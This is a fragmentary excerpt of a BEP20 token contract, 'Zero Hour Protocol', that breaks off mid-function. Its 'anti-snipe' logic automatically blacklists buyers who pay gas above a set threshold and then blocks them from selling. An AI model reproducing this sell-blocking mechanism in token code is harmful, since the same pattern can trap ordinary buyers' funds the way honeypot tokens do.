...
contract ZeroHour is IBEP20, Auth {
    ...
    string constant _name = "Zero Hour Protocol";
    string constant _symbol = "Zer0";
    ...
    uint256 public GasTBU = 4000000000;
    bool public  antiSnipeMode = true;
    mapping (address => bool) public ZeroTolerance;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x15C1de1c4b3Cf04A04F44c1EfdfBfF1B41f80603;
        devFeeReceiver = 0x9039C708B80961AC04Cd6E35964d1F0d0755c3dA;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if( antiSnipeMode){
            require(!ZeroTolerance[sender],"Bots cant sell");
            if(tx.gasprice > GasTBU && sender == pair){
                ZeroTolerance[recipient] = true;
